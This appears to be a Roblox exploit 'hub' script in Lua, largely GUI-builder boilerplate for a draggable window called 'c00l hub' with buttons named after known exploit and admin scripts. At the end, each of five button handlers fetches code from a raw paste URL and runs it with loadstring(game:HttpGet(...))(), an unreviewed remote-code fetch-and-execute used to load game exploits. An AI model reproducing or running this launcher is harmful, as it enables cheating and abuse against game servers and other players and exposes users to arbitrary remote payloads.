-- Gui to Lua
-- Version: 3.2

-- Instances:

local c00lhub = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local c00lgui = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local RevizAdminV3 = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Harked = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local ProjectLigmaClient = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local T0PK3K = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local UICorner_6 = Instance.new("UICorner")

--Properties:

c00lhub.Name = "c00l hub"
c00lhub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
c00lhub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = c00lhub
Frame.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
Frame.BorderColor3 = Color3.fromRGB(149, 149, 149)
Frame.Position = UDim2.new(0.228334561, 0, 0.113580234, 0)
Frame.Size = UDim2.new(0.373775512, 0, 0.008641975, 18)

TextLabel.Parent = Frame
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 6, 0, 0)
TextLabel.Size = UDim2.new(0.994816303, -4, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "c00l hub"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 0.200
ImageLabel.Position = UDim2.new(0, 0, 0.960000277, 0)
ImageLabel.Size = UDim2.new(0, 718, 0, 351)
ImageLabel.Image = "http://www.roblox.com/asset/?id=11517812580"

c00lgui.Name = "c00lgui"
c00lgui.Parent = ImageLabel
c00lgui.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
c00lgui.Position = UDim2.new(0.00835654605, 0, 0.102564104, 0)
c00lgui.Size = UDim2.new(0, 200, 0, 50)
c00lgui.Font = Enum.Font.Cartoon
c00lgui.Text = "c00lgui"
c00lgui.TextColor3 = Color3.fromRGB(255, 255, 255)
c00lgui.TextSize = 14.000

UICorner.Parent = c00lgui

RevizAdminV3.Name = "Reviz Admin V3"
RevizAdminV3.Parent = ImageLabel
RevizAdminV3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
RevizAdminV3.Position = UDim2.new(0.360724241, 0, 0.102564104, 0)
RevizAdminV3.Size = UDim2.new(0, 200, 0, 50)
RevizAdminV3.Font = Enum.Font.Cartoon
RevizAdminV3.Text = "Reviz Admin V3"
RevizAdminV3.TextColor3 = Color3.fromRGB(255, 255, 255)
RevizAdminV3.TextSize = 14.000

UICorner_2.Parent = RevizAdminV3

Harked.Name = "Harked"
Harked.Parent = ImageLabel
Harked.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Harked.Position = UDim2.new(0.710306406, 0, 0.102564104, 0)
Harked.Size = UDim2.new(0, 200, 0, 50)
Harked.Font = Enum.Font.Cartoon
Harked.Text = "Harked"
Harked.TextColor3 = Color3.fromRGB(255, 255, 255)
Harked.TextSize = 14.000

UICorner_3.Parent = Harked

ProjectLigmaClient.Name = "Project Ligma Client"
ProjectLigmaClient.Parent = ImageLabel
ProjectLigmaClient.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ProjectLigmaClient.Position = UDim2.new(0.00835654605, 0, 0.33048436, 0)
ProjectLigmaClient.Size = UDim2.new(0, 200, 0, 50)
ProjectLigmaClient.Font = Enum.Font.Cartoon
ProjectLigmaClient.Text = "Project Ligma Client"
ProjectLigmaClient.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectLigmaClient.TextSize = 14.000

UICorner_4.Parent = ProjectLigmaClient

T0PK3K.Name = "T0PK3K"
T0PK3K.Parent = ImageLabel
T0PK3K.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
T0PK3K.Position = UDim2.new(0.360724241, 0, 0.33048436, 0)
T0PK3K.Size = UDim2.new(0, 200, 0, 50)
T0PK3K.Font = Enum.Font.Cartoon
T0PK3K.Text = "T0PK3K"
T0PK3K.TextColor3 = Color3.fromRGB(255, 255, 255)
T0PK3K.TextSize = 14.000

UICorner_5.Parent = T0PK3K

TextLabel_2.Parent = ImageLabel
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.Position = UDim2.new(0.313370466, 0, 0.68091172, 0)
TextLabel_2.Size = UDim2.new(0, 272, 0, 50)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = "c0ming s00n"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 50.000

UICorner_6.Parent = TextLabel_2

-- Scripts:

local function AJYLHN_fake_script() -- Frame.Smooth GUI Dragging 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(AJYLHN_fake_script)()
local function LWZH_fake_script() -- c00lgui.LocalScript 
	local script = Instance.new('LocalScript', c00lgui)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://www.klgrth.io/paste/6457p/raw", true))()
	end)
end
coroutine.wrap(LWZH_fake_script)()
local function KNYDWA_fake_script() -- RevizAdminV3.LocalScript 
	local script = Instance.new('LocalScript', RevizAdminV3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://www.klgrth.io/paste/a44n9/raw'),true))()
	end)
end
coroutine.wrap(KNYDWA_fake_script)()
local function XILEPN_fake_script() -- Harked.LocalScript 
	local script = Instance.new('LocalScript', Harked)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://www.klgrth.io/paste/q8pr8/raw", true))()
	end)
end
coroutine.wrap(XILEPN_fake_script)()
local function BDLW_fake_script() -- ProjectLigmaClient.LocalScript 
	local script = Instance.new('LocalScript', ProjectLigmaClient)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://www.klgrth.io/paste/2kb69/raw", true))()
	end)
end
coroutine.wrap(BDLW_fake_script)()
local function BPKW_fake_script() -- T0PK3K.LocalScript 
	local script = Instance.new('LocalScript', T0PK3K)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://www.klgrth.io/paste/funvv/raw", true))()
	end)
end
coroutine.wrap(BPKW_fake_script)()
